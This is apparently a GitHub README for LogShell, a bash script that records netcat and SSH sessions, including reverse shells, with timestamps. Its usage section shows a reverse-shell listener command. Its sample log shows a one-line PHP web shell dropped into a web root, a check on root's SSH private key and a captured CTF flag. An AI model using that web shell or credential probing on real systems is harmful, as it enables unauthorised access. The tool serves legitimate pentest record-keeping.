<div align="center">
  <h1>🪵 LogShell 🐚</h1>
  <br/>
</div>

LogShell is bash script for logging network sessions established via netcat or SSH, such as reverse shells.

It ensures you always have a track of every command ran on a target to look back later.

## Features

- Records shell sessions with timestamped logging.
- Support for Ncat and SSH.
- Preserves color information of the recorded shell output.
- Handles backspaces in user input for clean output.
- Supports automatic detection and logging of session initiation.
- Seamless chains with other tools such as proxychains and rlwrap.
- Easy setup and usage.

## Usage

1. Clone the repository:
```bash
git clone https://github.com/BrunoRochaDev/LogShell.git
```

2. Navigate to the cloned directory:
```bash
cd LogShell
```

3. Make the script executable:
```bash
chmod +x logshell
```

4. (Optional) Move the script to a directory within your $PATH for easier access:
```bash
mv ./logshell /usr/bin
```

5. Run the script with your SSH / netcat command:
```bash
# Initiating SSH session logging
logshell ssh user@127.0.0.1

# Recording a reverse shell with Ncat and rlwrap
logshell rlwrap ncat -lnvp 1337
```

6. View the logs in /tmp/\<target\>.log (log location can be customized within the script):
```
┌──(user㉿kali)-[~]
└─$ cat /tmp/127.0.0.1.log
=============================================================
Shell session via SSH initiated at: 2024-05-30 19:48:41
=============================================================
(19:48:47) $ whoami
(19:48:47) user
(19:49:20) $ ip a
(19:49:20) eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
(19:49:20)         inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255
(19:49:20)         inet6 fe80::f816:3eff:fe21:57cf  prefixlen 64  scopeid 0x20<link>
(19:49:20)         ether f8:16:3e:21:57:cf  txqueuelen 1000  (Ethernet)
(19:49:20)         RX packets 150234  bytes 20345763 (19.4 MiB)
(19:49:20)         RX errors 0  dropped 0  overruns 0  frame 0
(19:49:20)         TX packets 134567  bytes 18320456 (17.4 MiB)
(19:49:20)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
(19:49:50) $ echo '<?=`$_GET[1]`?>' > /var/www/html/web-shell.php
(19:51:03) exit
=============================================================
Shell session via Ncat initiated at: 2024-05-30 19:53:50
=============================================================
(19:54:01) # id
(19:54:01) uid=0(root) gid=0(root) groups=0(root)
(19:56:45) # ls -la .ssh/id_rsa
(19:56:45) -rw-------. 1 root root 0 Nov 20  2023 .ssh/id_rsa
(19:57:44) # cat flag.txt
(19:57:44) FLAG{y0u_607_m3!}
```

## Future Work

- **Expand Compatibility:** Support additional clients and listeners like `socat` and `nc`.

- **Improve Command/Output Differentiation:** Enhance clarity between user input and listener output for better log readability.

- **Enhance TTY Formatting:** Implement better formatting to handle full TTY without artifacts.

## License
This project is licensed under the AGPLv3 License - see the [LICENSE](https://github.com/BrunoRochaDev/LogShell/blob/main/LICENSE) file for details.
